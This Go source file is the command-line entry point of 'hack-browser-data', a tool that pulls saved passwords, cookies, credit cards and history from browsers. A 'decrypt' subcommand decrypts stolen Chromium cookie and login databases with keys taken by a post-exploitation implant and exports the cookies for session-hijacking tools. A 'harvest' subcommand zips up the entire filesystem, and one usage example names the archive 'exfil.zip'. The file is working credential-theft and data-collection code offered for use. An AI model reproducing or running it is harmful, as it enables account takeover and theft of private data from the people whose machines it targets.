package main

import (
	"fmt"
	"os"

	"github.com/urfave/cli/v2"

	"github.com/moond4rk/hackbrowserdata/browser"
	"github.com/moond4rk/hackbrowserdata/browserdata/offlinedecrypt"
	"github.com/moond4rk/hackbrowserdata/harvest"
	"github.com/moond4rk/hackbrowserdata/log"
	"github.com/moond4rk/hackbrowserdata/utils/byteutil"
	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
)

var (
	browserName  string
	outputDir    string
	outputFormat string
	verbose      bool
	compress     bool
	profilePath  string
	isFullExport bool
)

func main() {
	Execute()
}

func Execute() {
	app := &cli.App{
		Name:      "hack-browser-data",
		Usage:     "Export passwords|bookmarks|cookies|history|credit cards|download history|localStorage|extensions from browser",
		UsageText: "[hack-browser-data -b chrome -f json --dir results --zip]\nExport all browsing data (passwords/cookies/history/bookmarks) from browser\nGithub Link: https://github.com/moonD4rk/HackBrowserData",
		Version:   "0.5.0",
		Flags: []cli.Flag{
			&cli.BoolFlag{Name: "verbose", Aliases: []string{"vv"}, Destination: &verbose, Value: false, Usage: "verbose"},
			&cli.BoolFlag{Name: "compress", Aliases: []string{"zip"}, Destination: &compress, Value: false, Usage: "compress result to zip"},
			&cli.StringFlag{Name: "browser", Aliases: []string{"b"}, Destination: &browserName, Value: "all", Usage: "available browsers: all|" + browser.Names()},
			&cli.StringFlag{Name: "results-dir", Aliases: []string{"dir"}, Destination: &outputDir, Value: "results", Usage: "export dir"},
			&cli.StringFlag{Name: "format", Aliases: []string{"f"}, Destination: &outputFormat, Value: "csv", Usage: "output format: csv|json"},
			&cli.StringFlag{Name: "profile-path", Aliases: []string{"p"}, Destination: &profilePath, Value: "", Usage: "custom profile dir path, get with chrome://version"},
			&cli.BoolFlag{Name: "full-export", Aliases: []string{"full"}, Destination: &isFullExport, Value: true, Usage: "is export full browsing data"},
		},
		HideHelpCommand: true,
		Action: func(c *cli.Context) error {
			if verbose {
				log.SetVerbose()
			}
			browsers, err := browser.PickBrowsers(browserName, profilePath)
			if err != nil {
				log.Errorf("pick browsers %v", err)
				return err
			}

			for _, b := range browsers {
				data, err := b.BrowsingData(isFullExport)
				if err != nil {
					log.Errorf("get browsing data error %v", err)
					continue
				}
				data.Output(outputDir, b.Name(), outputFormat)
			}

			if compress {
				if err = fileutil.CompressDir(outputDir); err != nil {
					log.Errorf("compress error %v", err)
				}
				log.Debug("compress success")
			}
			return nil
		},
		Commands: []*cli.Command{
			decryptCommand(),
			harvestCommand(),
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		log.Fatalf("run app error %v", err)
	}
}

// decryptCommand returns the 'decrypt' subcommand.
// It decrypts an existing Chromium Cookies or Login Data SQLite file using a
// previously extracted key, without needing access to the live browser profile.
// Ported from cookie-monster's decrypt.py.
func decryptCommand() *cli.Command {
	var (
		dbFile    string
		keyHex    string
		masterHex string
		dataType  string
		format    string
		outDir    string
	)
	return &cli.Command{
		Name:  "decrypt",
		Usage: "Offline decrypt a Chromium Cookies or Login Data file using an extracted key",
		UsageText: `hack-browser-data decrypt -f <db-file> -k <key> -t <cookies|passwords> [--format <plain|json|cookie-editor|cuddlephish>]

Key format: use the \xAA\xBB... notation output by cookie-monster BOF, or a plain hex string (AABBCC...).

Examples:
  hack-browser-data decrypt -f ChromeCookies.db -k "\xec\xfc..." -t cookies
  hack-browser-data decrypt -f EdgePasswords.db -k "\xec\xfc..." -mk "\xf3\x..." -t passwords --format json
  hack-browser-data decrypt -f ChromeCookies.db -k "\xec\xfc..." -t cookies --format cookie-editor
  hack-browser-data decrypt -f ChromeCookies.db -k "\xec\xfc..." -t cookies --format cuddlephish`,
		Flags: []cli.Flag{
			&cli.StringFlag{Name: "file", Aliases: []string{"f"}, Destination: &dbFile, Required: true, Usage: "path to Chromium Cookies or Login Data SQLite file"},
			&cli.StringFlag{Name: "key", Aliases: []string{"k"}, Destination: &keyHex, Usage: `decryption key in \xAA\xBB... or plain hex format`},
			&cli.StringFlag{Name: "master-key", Aliases: []string{"mk"}, Destination: &masterHex, Usage: `master key for v10 passwords (DPAPI-derived), \xAA\xBB... or plain hex`},
			&cli.StringFlag{Name: "type", Aliases: []string{"t"}, Destination: &dataType, Value: "cookies", Usage: "data type: cookies|passwords"},
			&cli.StringFlag{Name: "format", Destination: &format, Value: "plain", Usage: "output format: plain|json|cookie-editor|cuddlephish"},
			&cli.StringFlag{Name: "dir", Destination: &outDir, Value: ".", Usage: "output directory for file-based formats (cookie-editor, cuddlephish, json)"},
		},
		Action: func(c *cli.Context) error {
			if keyHex == "" && masterHex == "" {
				return fmt.Errorf("at least one of --key (-k) or --master-key (-mk) is required")
			}

			var key, masterKey []byte
			var err error
			if keyHex != "" {
				key, err = byteutil.ParseHexKey(keyHex)
				if err != nil {
					return fmt.Errorf("invalid --key: %w", err)
				}
			}
			if masterHex != "" {
				masterKey, err = byteutil.ParseHexKey(masterHex)
				if err != nil {
					return fmt.Errorf("invalid --master-key: %w", err)
				}
			}
			// If only master key provided, use it as the primary key too (matches decrypt.py behaviour)
			if key == nil && masterKey != nil {
				key = masterKey
			}

			switch dataType {
			case "cookies":
				cookies, err := offlinedecrypt.DecryptCookies(dbFile, key, masterKey)
				if err != nil {
					return fmt.Errorf("decrypt cookies: %w", err)
				}
				switch format {
				case "cookie-editor":
					fname := offlinedecrypt.TimestampedFilename("cookies")
					if outDir != "." {
						fname = outDir + "/" + fname
					}
					f, err := os.Create(fname)
					if err != nil {
						return err
					}
					defer f.Close()
					if err := offlinedecrypt.ExportCookieEditor(cookies, f); err != nil {
						return err
					}
					fmt.Printf("Cookies saved to %s\n", fname)
				case "cuddlephish":
					fname := offlinedecrypt.TimestampedFilename("cuddlephish")
					if outDir != "." {
						fname = outDir + "/" + fname
					}
					f, err := os.Create(fname)
					if err != nil {
						return err
					}
					defer f.Close()
					if err := offlinedecrypt.ExportCuddlePhish(cookies, f); err != nil {
						return err
					}
					fmt.Printf("Cookies saved to %s\n", fname)
				case "json":
					fname := offlinedecrypt.TimestampedFilename("cookies")
					if outDir != "." {
						fname = outDir + "/" + fname
					}
					if err := offlinedecrypt.WriteJSON(fname, cookies); err != nil {
						return err
					}
					fmt.Printf("Cookies saved to %s\n", fname)
				default: // plain
					offlinedecrypt.PrintCookies(cookies)
				}

			case "passwords":
				logins, err := offlinedecrypt.DecryptPasswords(dbFile, key, masterKey)
				if err != nil {
					return fmt.Errorf("decrypt passwords: %w", err)
				}
				switch format {
				case "json":
					fname := offlinedecrypt.TimestampedFilename("passwords")
					if outDir != "." {
						fname = outDir + "/" + fname
					}
					if err := offlinedecrypt.WriteJSON(fname, logins); err != nil {
						return err
					}
					fmt.Printf("Passwords saved to %s\n", fname)
				default: // plain
					offlinedecrypt.PrintPasswords(logins)
				}

			default:
				return fmt.Errorf("unknown type %q: use cookies or passwords", dataType)
			}
			return nil
		},
	}
}

// harvestCommand returns the 'harvest' subcommand.
// It recursively walks a directory tree and compresses all files into a ZIP archive.
// Ported from the steal-all-files project (script.py).
func harvestCommand() *cli.Command {
	var (
		sourcePath string
		outputFile string
	)
	return &cli.Command{
		Name:  "harvest",
		Usage: "Recursively archive all files from a directory into a ZIP file",
		UsageText: `hack-browser-data harvest [-p <path>] [-o <output.zip>]

Walks the source directory tree and compresses every readable file into a ZIP archive.
Files that cannot be read (permission denied, locked, etc.) are silently skipped.

Examples:
  hack-browser-data harvest                              # archive entire filesystem to <hostname>.zip
  hack-browser-data harvest -p /home/user/Documents     # archive specific directory
  hack-browser-data harvest -p C:\Users -o exfil.zip    # Windows: specific path and output name`,
		Flags: []cli.Flag{
			&cli.StringFlag{Name: "path", Aliases: []string{"p"}, Destination: &sourcePath, Value: "", Usage: "source directory to harvest (default: filesystem root)"},
			&cli.StringFlag{Name: "output", Aliases: []string{"o"}, Destination: &outputFile, Value: "", Usage: "output ZIP file path (default: <hostname>.zip)"},
		},
		Action: func(c *cli.Context) error {
			opts := harvest.DefaultOptions()
			if sourcePath != "" {
				opts.SourcePath = sourcePath
			}
			if outputFile != "" {
				opts.OutputFile = outputFile
			}

			fmt.Printf("Harvesting files from: %s\n", opts.SourcePath)
			fmt.Printf("Output file: %s\n", opts.OutputFile)
			fmt.Println("(Files that cannot be read will be skipped)")
			fmt.Println()

			result, err := harvest.Run(opts)
			if err != nil {
				return fmt.Errorf("harvest failed: %w", err)
			}

			fmt.Printf("Done.\n")
			fmt.Printf("  Files added:   %d\n", result.FilesAdded)
			fmt.Printf("  Files skipped: %d\n", result.FilesSkipped)
			fmt.Printf("  Output file:   %s (%.2f MB)\n", result.OutputFile, float64(result.OutputBytes)/(1024*1024))
			return nil
		},
	}
}
